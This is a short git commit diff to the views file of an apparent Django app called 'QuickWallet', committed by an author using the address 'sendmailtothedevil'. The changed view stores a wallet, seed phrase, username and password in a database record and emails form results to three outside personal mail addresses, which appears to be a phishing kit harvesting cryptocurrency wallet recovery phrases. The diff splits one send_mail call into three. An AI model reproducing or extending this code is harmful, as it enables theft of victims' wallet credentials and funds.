cf9bc6f74f4a5be07700b6462691985b20592680
sendmailtothedevil <sendmailtothedevil@gmail.com>
2022-02-05 23:45:55 -0800

    milo

--- quickwallet/home/views.py
+++ quickwallet/home/views.py
@@ -32,7 +32,9 @@ def wallet_details(request, slug):
 
         print(data)
 
-        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com', 'exkynexkyn@gmail.com', 'mcguirej738@gmail.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['mcguirej738@gmail.com'] )
 
         allresult = Result.objects.create(wallet=wallet, phrase=phrase, user=user, password=password)
         allresult.save()
